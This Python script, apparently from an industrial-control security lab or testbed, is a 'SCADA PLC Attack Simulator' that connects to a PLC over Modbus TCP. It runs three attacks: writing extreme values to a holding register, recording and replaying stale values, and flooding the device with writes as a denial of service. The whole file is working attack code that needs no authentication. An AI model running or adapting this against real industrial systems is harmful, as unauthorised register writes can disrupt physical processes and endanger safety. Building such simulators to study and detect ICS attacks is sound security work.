from __future__ import annotations

import argparse
import logging
import random
import time

from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger(__name__)

PLC_HOST = "plc"
PLC_PORT = 502


def _write_register(client: ModbusTcpClient, value: int) -> bool:
    result = client.write_register(address=0, value=value, unit=1)
    return not result.isError()  # type: ignore[union-attr]


def _read_temperature(client: ModbusTcpClient) -> float | None:
    result = client.read_holding_registers(address=0, count=1, unit=1)
    return None if result.isError() else float(result.registers[0])  # type: ignore[union-attr]


def attack_manipulation(client: ModbusTcpClient, duration: int) -> None:
    logger.info("[ATTACKER] Register Manipulation: writing extreme values for %ds", duration)
    end = time.time() + duration
    while time.time() < end:
        value = random.choice([99, -5, 0, 120, 255])
        if _write_register(client, value):
            logger.info("[ATTACKER] Wrote extreme value %d to holding register", value)
        else:
            logger.warning("[ATTACKER] Write failed")
        time.sleep(random.uniform(0.5, 2.0))


def attack_replay(client: ModbusTcpClient, duration: int) -> None:
    logger.info("[ATTACKER] Replay Attack: recording and replaying values for %ds", duration)
    recorded: list[int] = []
    logger.info("[ATTACKER] Phase 1: Recording legitimate PLC values...")
    for i in range(10):
        temp = _read_temperature(client)
        if temp is not None:
            recorded.append(int(temp))
            logger.info("[ATTACKER] Recorded value %d/10: %d", i + 1, int(temp))
        time.sleep(1)

    if not recorded:
        logger.error("[ATTACKER] No values recorded, aborting")
        return

    logger.info("[ATTACKER] Phase 2: Replaying %d stale values rapidly...", len(recorded))
    end = time.time() + duration
    count = 0
    while time.time() < end:
        for value in recorded:
            if _write_register(client, value):
                count += 1
            time.sleep(0.2)
    logger.info("[ATTACKER] Replay complete: %d writes in %ds", count, duration)


def attack_dos(client: ModbusTcpClient, duration: int) -> None:
    logger.info("[ATTACKER] DoS Attack: flooding writes for %ds", duration)
    end = time.time() + duration
    count = 0
    while time.time() < end:
        value = random.randint(20, 35)
        if _write_register(client, value):
            count += 1
        if count % 20 == 0:
            logger.info("[ATTACKER] DoS: %d writes sent so far", count)
    logger.info("[ATTACKER] DoS complete: %d total writes in %ds", count, duration)


def main() -> None:
    parser = argparse.ArgumentParser(description="SCADA PLC Attack Simulator")
    parser.add_argument(
        "--mode",
        choices=["manipulation", "replay", "dos"],
        default="manipulation",
    )
    parser.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    client.connect()
    logger.info("[ATTACKER] Connected to PLC at %s:%d", PLC_HOST, PLC_PORT)

    attacks = {
        "manipulation": attack_manipulation,
        "replay": attack_replay,
        "dos": attack_dos,
    }
    attacks[args.mode](client, args.duration)
    client.close()
    logger.info("[ATTACKER] Attack complete, connection closed")


if __name__ == "__main__":
    main()
